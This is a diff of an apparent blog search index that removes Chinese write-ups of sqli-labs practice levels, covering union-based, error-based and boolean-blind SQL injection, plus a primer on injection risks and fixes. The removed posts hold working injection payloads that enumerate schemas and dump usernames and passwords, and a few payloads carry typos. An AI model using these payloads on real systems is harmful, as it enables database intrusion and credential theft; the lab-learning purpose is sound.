@@ -108,32 +108,6 @@
     
     
     <entry>
-      <title>sql-labs靶场less8(盲注)</title>
-      <link href="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/"/>
-      <url>/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/</url>
-      
-        <content type="html"><![CDATA[<p>bool盲注常用的函数</p><pre><code>database()   显示数据库名称left(a,b)    从左侧截取a的前b位substr(a,b,c) 从b位置开始，截取字符串a到c的长度mid(a,b,c)  从b位置开始，截取a字符串的c位length()    返回字符串长度ascii()      将某个字符转换成ascii值char()       将ascii码转换为对应的字符</code></pre><p>打开源码看了一下</p><p>这道题可以使用时间盲注，不能使用报错注入，因为报错的信息被注释掉了</p><p><img src="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/image-20230515103641066.png" alt="image-20230515103641066"></p><p>1.判断注入点</p><pre><code>?id=1   页面正常，但是没有显示消息</code></pre><p><img src="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/image-20230515105031032.png" alt="image-20230515105031032"></p><p>加单引号</p><p><img src="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/image-20230515105151868.png" alt="image-20230515105151868"></p><p>页面无回显，应该是报错了</p><p>继续试试</p><pre><code>?id=1 and 1=1?id=1 and 1=2 页面都正常，说明不是数字型注入，?id=1&#39; and 1=1 --+  页面正常，可以正常的显示    真      真    真?id=1&#39; and 1=2 --+   真       假    假页面发生变化(没有报错，只是查不出来数据，和上面的无回显不一样)，说明是单引号闭合的字符型注入。</code></pre><p>1.查看数据库版本</p><pre><code>?id=1&#39; and left(version(),1)=5 %23</code></pre><p><img src="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/image-20230515112258415.png" alt="image-20230515112258415"></p><p>这个数据库的版本为5.7.42 ，上面的语句是看版本号的第一位是不是5，如果回显正常，那么说明第一位就是5</p><p>上图显示正常，剩下的慢慢测，一般使用脚本。</p><p>2.猜解数据库的长度</p><pre><code>?id=1&#39; and length(database(),1)&gt;&#39;a&#39; --+</code></pre><p><img src="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/image-20230515114347238.png" alt="image-20230515114347238"></p><p>数据库长度为 8 时，页面回显正常。这里说明下，长度要一个一个的试，这里只是验证下，在要爆信息不多的情况下可以手动试试（二分法可以提高很多效率），太多的话就建议用脚本，或者用burp 爆破。</p><p>3.猜数据库名字</p><pre><code>?id=1&#39; and left(databse(),1)&gt;&#39;a&#39; --+</code></pre><p><code>left(a,b)</code>：返回a字符串从左至b位数，详细看下面用法</p><p>4.猜表名</p><pre><code>?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit x,1),y)=&quot;&quot;--+</code></pre><p>5.猜字段名</p><pre><code>?id=1&#39; and left((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit x,1),y)=&quot;&quot;--+</code></pre><p>6.猜数据</p><p>用户名</p><pre><code>?id=1&#39; and left((select username from users limit x,1),y)=&quot;&quot;--+</code></pre><p>通过变换x，y的值可以得到所有的用户名 。</p><p>密码</p><pre><code>?id=1&#39; and left((select password from users limit x,1),y)=&quot;&quot;--+</code></pre><p>通过变换 x，y 的值可以得到所有的密码 。</p><p>通过布尔盲注手工注入比较繁琐，可以用脚本。</p><p>下面分享脚本</p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>sql-labs靶场less7</title>
-      <link href="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless7/"/>
-      <url>/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless7/</url>
-      
-        <content type="html"><![CDATA[<p>打开题目</p><p>1.判断是否是数字型传参</p><p>2.判断是否有单引号闭合</p><p>3.判断是否有双引号闭合</p><p>4.判断是否单引号+括号闭合</p><p>5.判断是否是双引号+括号闭合</p><p>如果以上都不是，那以上规则都同时加上sleep测试一遍，看是不是存在延时注入</p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>布尔盲注和时间盲注</title>
       <link href="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
       <url>/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
@@ -147,89 +121,11 @@
     
     
     <entry>
-      <title>sql-labs靶场less6</title>
-      <link href="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/"/>
-      <url>/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/</url>
-      
-        <content type="html"><![CDATA[<p>1.判断注入点（双引号注入）</p><pre><code>?id=1&quot; and 1 --a   页面显示正常</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514203911904.png" alt="image-20230514203911904"></p><pre><code>?id=1&quot; and 0 -- a   页面异常（空显示）</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514205048775.png" alt="image-20230514205048775"></p><p>2.判断字符长度</p><p>判断当前使用的数据库长度是否大于1</p><pre><code>?id=1&quot; and length(database())=8 --+</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514221524192.png" alt="image-20230514221524192"></p><p>3.穷举字符</p><p>判断当前使用的数据库第一个字符的ascll码是否大于1（肯定大于），地址栏输入</p><pre><code>?id=1&quot; and ascii(substr(database(),1,1)) &gt; 1 -- a</code></pre><pre><code>?id=1&quot; and left(database(),1)=&#39;s&#39; --+用穷举的方法一个个列出来，....效率有点慢了</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514222128909.png" alt="image-20230514222128909"></p><pre><code>?id=1&quot; and left(database(),8)=&#39;security&#39; --+</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514225957158.png" alt="image-20230514225957158"></p><p>4.判断库中每个表名的长度</p><pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 6--+</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514232750125.png" alt="image-20230514232750125"></p><p>第一个表的长度是6</p><pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1)) = 8--+</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514232933832.png" alt="image-20230514232933832"></p><p>第二个表的长度为8</p><pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 2,1)) = 7--+</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514233146882.png" alt="image-20230514233146882"></p><p>第三个表的长度为7</p><pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 3,1)) = 5--+</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514233314642.png" alt="image-20230514233314642"></p><p>第四个表的长度为5</p><p>5.爆破表名</p><pre><code>?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) &gt; 100 --+</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514233558822.png" alt="image-20230514233558822"></p><pre><code>?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514233732069.png" alt="image-20230514233732069"></p><p>查看ascii表101是e，第一个表开头字母是e</p><p>…..此处省略一些步骤</p><pre><code>?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),2,1))=115 --+</code></pre><p><img src="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/image-20230514234142010.png" alt="image-20230514234142010"></p><p>查看ascii表115是u，第一个表开头字母是u</p><p>….表名是users</p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>sql-labs靶场less4</title>
-      <link href="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/"/>
-      <url>/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/</url>
-      
-        <content type="html"><![CDATA[<p>在复习一下less4</p><p>less-3是单引号+右括号，less-4是双引号+右括号</p><p>1.判断注入点</p><p>一开始，？id=1 直接回显用户名和密码，</p><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230513235842630.png" alt="image-20230513235842630"></p><p>在尝试一下别的符号</p><p>?id=1”  出现报错信息</p><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230514000027873.png" alt="image-20230514000027873"></p><p>错误提示是【”1””) LIMIT 0,1】，去掉自己输入的一个双引号后可以看出还有两个双引号和一个右括号，由此判可推出sql注入是由双引号和右括号和起来的闭合模式。</p><p>2.查字段名</p><p>输入</p><pre><code>？id=1&#39; and 1=2 --+</code></pre><p>后，提示超出列数，则尝试把4改成3，发现无报错，说明数据库查询语句查询列数为3列</p><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230514000300269.png" alt="image-20230514000300269"></p><p>3.查输出列的位置</p><pre><code>xxxxxxxxxx ?id=-1&quot;) union select 1,2,3 --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230514000817750.png" alt="image-20230514000817750"></p><p>4.查看当前数据库和版本</p><pre><code>?id=-1&quot;) union select 1,database(),version() --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230514001038494.png" alt="image-20230514001038494"></p><p>5.查看当前数据库下的表</p><pre><code>?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230514001411510.png" alt="image-20230514001411510"></p><p>6.查看user表下面的字段信息</p><pre><code>？id=-1&#39; union select 1,2,3 --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230514001554807.png" alt="image-20230514001554807"></p><p>7.查看字段数据</p><pre><code>?id=-1&quot;) union select 1,group_concat(username,0x2a,password),3 from users --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/image-20230514001730590.png" alt="image-20230514001730590"></p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>sql-labs靶场less4</title>
-      <link href="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/"/>
-      <url>/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/</url>
-      
-        <content type="html"><![CDATA[<p>在复习一下less4</p><p>less-3是单引号+右括号，less-4是双引号+右括号</p><p>1.判断注入点</p><p>一开始，？id=1 直接回显用户名和密码，</p><p>​              ？id=1’ 也是直接回显用户名和密码</p><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230513235842630.png" alt="image-20230513235842630"></p><p>在尝试一下别的符号</p><p>?id=1”  出现报错信息</p><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514000027873.png" alt="image-20230514000027873"></p><p>错误提示是【”1””) LIMIT 0,1】，去掉自己输入的一个双引号后可以看出还有两个双引号和一个右括号，由此判可推出sql注入是由双引号和右括号和起来的闭合模式。</p><p>2.查字段名</p><p>输入</p><pre><code>?id=1&quot;) order by 4 --+</code></pre><p>后，提示超出列数，则尝试把4改成3，发现无报错，说明数据库查询语句查询列数为3列</p><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514000300269.png" alt="image-20230514000300269"></p><p>3.查输出列的位置</p><pre><code>?id=-1&quot;) union select 1,2,3 --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514000817750.png" alt="image-20230514000817750"></p><p>4.查看当前数据库和版本</p><pre><code>?id=-1&quot;) union select 1,database(),version() --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514001038494.png" alt="image-20230514001038494"></p><p>5.查看当前数据库下的表</p><pre><code>?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514001411510.png" alt="image-20230514001411510"></p><p>6.查看user表下面的字段信息</p><pre><code>?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514001554807.png" alt="image-20230514001554807"></p><p>7.查看字段数据</p><pre><code>?id=-1&quot;) union select 1,group_concat(username,0x2a,password),3 from users --+</code></pre><p><img src="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/image-20230514001730590.png" alt="image-20230514001730590"></p><p>完成！！！！！！</p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>sql-labs靶场less3</title>
-      <link href="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/"/>
-      <url>/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/</url>
-      
-        <content type="html"><![CDATA[<p>今天浅浅复习一下</p><p>1.判断注入点，</p><p>输入？id=1 显示正常 </p><p>​     ？id=1’ 不正常  说明存在注入</p><p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513221043279.png" alt="image-20230513221043279"></p><p>上图显示）附近有语法错误，所以构造语句的时候需要用）进行闭合</p><pre><code>?id=1&#39;) union select 1 --+</code></pre><p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513224322394.png" alt="image-20230513224322394"></p><p>上面图片显示列数不正确，盲猜试试三列</p><p>2.判断字段数</p><pre><code>?id=1&#39;) union select 1,2,3 --+</code></pre><p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513224510771.png" alt="image-20230513224510771"></p><p>字段数为4时报错，说明字段数为3</p><p>3.判断回显</p><p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513224733973.png" alt="image-20230513224733973"></p><p>4.查看当前数据库和版本</p><pre><code>?id=-1&#39;) union select 1,database(),version() --+</code></pre><p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513224934066.png" alt="image-20230513224934066"></p><p>5.查看数据库名称</p><pre><code>?id=-1&#39;) union select 1，group_concat(schema_name),3 from information_schema.schemata --+</code></pre><p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513230621168.png" alt="image-20230513230621168"></p><p>6.查看security库里面的表名</p><pre><code>?id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;</code></pre><p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513231141345.png" alt="image-20230513231141345"></p><p>7.获取列名</p><pre><code>?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></pre><p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513231403867.png" alt="image-20230513231403867"></p><p>8.字段数据</p><p>获取到字段后，根据字段获取表里的数据。字段名之间再加上*字符的十六进制，可以把账号密码隔开，容易区分</p><pre><code>?id=-1&#39;) union select 1,group_concat(username,0x2a,password),3 from users --+</code></pre><p><img src="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/image-20230513231622174.png" alt="image-20230513231622174"></p><p>完成！！！</p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>sql-labs靶场less2</title>
-      <link href="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/"/>
-      <url>/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/</url>
-      
-        <content type="html"><![CDATA[<p>练习回顾靶场less2</p><p>tips：可以打开每一关的源码，在该位置添加一句代码方便做题分析，</p><pre><code>echo&quot;sql里面执行的是&quot;.$sql.&quot;&lt;br&gt;&quot;;</code></pre><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230512225159607.png" alt="image-20230512225159607"></p><p>1.判断注入类型</p><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230512225353576.png" alt="image-20230512225353576"></p><p>可以知道是数值型</p><p>2.判断字段数</p><pre><code>?id=1 order by 4 不正常?id=1 order by 3 正常</code></pre><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230512225530782.png" alt="image-20230512225530782"></p><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230512225927074.png" alt="image-20230512225927074"></p><p>可以确定有三列</p><p>3.判断可以回显的字段数</p><pre><code>?id=-1 union select 1,2,3</code></pre><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513193541123.png" alt="image-20230513193541123"></p><p>4.判断数据库名和版本</p><pre><code>?id=-1 union select 1,database(),version()</code></pre><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513194524358.png" alt="image-20230513194524358"></p><p>5.获取表名</p><pre><code>?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;</code></pre><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513195104430.png" alt="image-20230513195104430"></p><p>6.获取列名</p><pre><code>?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;</code></pre><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513195526249.png" alt="image-20230513195526249"></p><p>7.获取数据</p><pre><code>?id=-1 union select 1,username,password from security.users limit 0,1 --+</code></pre><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513195823876.png" alt="image-20230513195823876"></p><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513195921714.png" alt="image-20230513195921714"></p><p><img src="/2023/05/12/%E2%80%99sql-labsless2%E2%80%99/image-20230513200006154.png" alt="image-20230513200006154"></p><p>第n条…..依次类推limit n，1</p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>报错注入</title>
       <link href="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
       <url>/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
       
         <content type="html"><![CDATA[<h2 id="报错注入的定义"><a href="#报错注入的定义" class="headerlink" title="报错注入的定义"></a>报错注入的定义</h2><p>当网站的页面上没有显示位用于展示SQL语句执行后的结果，但是SQL语句执行可以输出错误信息，那么攻击者可以利用注入过程中返回的错误信息进行判断。</p><p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p><h2 id="常见的函数"><a href="#常见的函数" class="headerlink" title="常见的函数"></a>常见的函数</h2><p>1.extractvalue()</p><p>2.updataxml()</p><p>3.count() + rand() +floor() +group  by() 导致的主键重复</p><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>extractvalue (xml_document,xpath_string)</p><p>第一个参数是xml文档对象名称</p><p>第二个参数作用是从xml文档对象中返回查询到的字符串值，返回结果长度限制在32位字符。</p><pre><code>extractvalue(null,concat(0x7e,(sqli_inject),0x7e))注：利用extractvalue()对数据进行一个排序，指定一个参数为null，可以换成1、#或者其他符号，使其报错，并执行第二个参数语句。0x7e表示&quot;-&quot;号。</code></pre><h2 id="UpdateXml函数"><a href="#UpdateXml函数" class="headerlink" title="UpdateXml函数"></a>UpdateXml函数</h2><p>函数用法：</p><p>UPDATEXML(XML_document,XPath_string,new_value)</p><p>三个字符串参数：</p><p>1  .XML_Document是String格式，为XML文档对象的名称</p><p>2   .XPath_string(<a href="https://so.csdn.net/so/search?q=Xpath&spm=1001.2101.3001.7020">Xpath</a> 格式的字符串)</p><p>3    .new_value,string格式，替换查找到符合条件的数据</p><h3 id="为什么可以用于报错注入："><a href="#为什么可以用于报错注入：" class="headerlink" title="为什么可以用于报错注入："></a>为什么可以用于报错注入：</h3><p>UpdateXml 函数实际上是去更新了XML文档，但是我们在XML文档路径的位置里面写入了<a href="https://so.csdn.net/so/search?q=%E5%AD%90%E6%9F%A5%E8%AF%A2&spm=1001.2101.3001.7020">子查询</a>，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候他其实已经执行了那个子查询代码。</p><h2 id="sqli靶场less5"><a href="#sqli靶场less5" class="headerlink" title="sqli靶场less5"></a>sqli靶场less5</h2><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230514102049350.png" alt="image-20230514102049350"></p><p>1.判断注入类型</p><p>get 1’ and ’1’ =’1 回显如下：</p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510231110006.png" alt="image-20230510231110006"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510231854074.png" alt="image-20230510231854074"></p><pre><code>？id=1’ 报错，单引号导致，页面显示数据库的报错信息，确定注入点为单引号字符型</code></pre><p>2.判断报错函数是否可用</p><pre><code>？id=0&#39; and updatexml(1,0x7e)--a</code></pre><p>页面正常报错，确定报错函数可用</p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510232558988.png" alt="image-20230510232558988"></p><p>3.脱库</p><p>获取所有的数据库，地址栏输入：</p><pre><code>?id=1&#39; and updatexml(1,    substr(      concat(0x7e,          (select group_concat(schema_name)           from information_schema.schemata)       )    ,34,31),3) -- a</code></pre><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510232905062.png" alt="image-20230510232905062"></p><p>获取security库中的所有表，地址栏输入：</p><pre><code>?id=1&#39; and extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema = &#39;security&#39;))) %23</code></pre><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510233507675.png" alt="image-20230510233507675"></p><p>查user表中的列名</p><pre><code>？id=1&#39; union select 1,2, (updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;security&#39; and table_name = &#39;users&#39;)),1)) %23</code></pre><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510233925272.png" alt="image-20230510233925272"></p><p>查字段（双查询注入）</p><pre><code>1&#39; union select 1, count(*), concat((select concat(username,&#39;:&#39;,password) from users  limit 0,1), floor(rand(0)*2)) a from information_schema.tables group by a  %23</code></pre><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234240463.png" alt="image-20230510234240463"></p><p>将0改为1,2,3,4……..</p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234427307.png" alt="image-20230510234427307"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234518718.png" alt="image-20230510234518718"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234547823.png" alt="image-20230510234547823"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234636472.png" alt="image-20230510234636472"></p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>sql注入</title>
-      <link href="/2023/05/07/sql%E6%B3%A8%E5%85%A5/"/>
-      <url>/2023/05/07/sql%E6%B3%A8%E5%85%A5/</url>
-      
-        <content type="html"><![CDATA[<h2 id="什么是sql注入？"><a href="#什么是sql注入？" class="headerlink" title="什么是sql注入？"></a>什么是sql注入？</h2><p><code>SQL注入就是在web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来对数据库的任意操作。</code></p><p>php代码举例：</p><pre><code>$query = &quot;select * from users where id = $_GET[&#39;id&#39;];</code></pre><h2 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h2><p>sql注入漏洞的产生需要满足以下两个条件：</p><p>1.<code>参数用户可控</code>：前端传给后端的参数内容是用户可以控制的；</p><p>2.<code>参数传入数据库查询</code>：传入的参数拼接到sql语句，且带入数据库查询。</p><p>当传入的id参数为 1’ 时，</p><pre><code>select * from users where id=1&#39;</code></pre><p>这不符合数据库语法的规范，所以会报错。</p><p>当传入的id参数为and 1=1 时，</p><pre><code>select * from users where id= 1 and 1 = 1</code></pre><p>因为1 = 1为真，且where语句中id=1也为真，所以页面会返回与id = 1相同的结果，</p><p>当传入的id参数为and 1 =2时，由于 1=2不成立，所以返回假，页面就会返回与id =1不同的结果。</p><h2 id="mysql查询语句"><a href="#mysql查询语句" class="headerlink" title="mysql查询语句"></a>mysql查询语句</h2><p>1.在不知道任何条件时，</p><pre><code>select 要查询的字段名 from 库名.表名</code></pre><p>2.在知道一条已知条件时，</p><pre><code>select 要查询的字段名 from 库名.表名 where 已知条件的字段名=&#39;已知条件的值&#39;</code></pre><p>3.在知道两条已知条件时，</p><pre><code>select 要查询的字段名 from 库名.表名 where 已知条件1的字段名 = &#39;已知条件1的值&#39; and 已知条件2的字段名=&#39;已知条件2的值&#39;</code></pre><h2 id="limit用法"><a href="#limit用法" class="headerlink" title="limit用法"></a>limit用法</h2><p>limit的使用格式为limit m ,n, 其中m是记录开始的位置，从0开始，表示第一条记录；n是指取n条记录。</p><p>eg：limit 0,1表示从第一条记录开始，去一条记录。</p><h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><p>mysql中常见的注释符： #或  –空格  或  /**/</p><h2 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h2><pre><code>内联注释的形式：/*!code*/</code></pre><p>内联注释可以用于整个sql语句</p><pre><code>index.php?id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3</code></pre><p>?加参数  &amp;连接参数</p><h2 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h2><p>1.按照提交的数据类型有：数字型、字符型和搜索型</p><p>2.按照提交方式有：GET注入、POST注入、cookie注入、http头注入等</p><p>3.按照执行效果有：基于布尔的盲注、基于时间的盲注、基于报错注入、联合查询注入</p><h2 id="sql注入危害"><a href="#sql注入危害" class="headerlink" title="sql注入危害"></a>sql注入危害</h2><p>1.<code>数据库信息泄漏</code>：数据库中存放的用户的隐私信息的泄露。</p><p>2.<code>网页篡改</code>：通过操纵数据库对特定网页进行篡改。</p><p>3.<code>网站被挂马，传播恶意软件</code>：修改数据库一些字段值，嵌入网马链接，进行挂马攻击。</p><p>4.<code>数据库被恶意操作</code>：数据库服务器被攻击，数据库的系统管理员账户被篡改。</p><p>5.<code>服务器被远程控制，被安装后门</code>。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</p><p>6.<code>破坏硬盘数据，瘫痪全系统</code>。</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>1.<code>过滤危险字符</code>：例如，采用正则表达式匹配union、sleep、load_file等关键字，如果匹配到，则退出程序。</p><p>2.<code>使用预编译语句</code>：使用PDO预编译语句，需要注意，不要将变量直接拼接到PDO语句中，而是使用占位符进行数据库的<code>增加</code>、<code>删除</code>、<code>修改</code>、<code>查询</code>。</p><p>3.<code>特殊字符转义、使用严格的数据类型</code>。</p>]]></content>
       
       
       
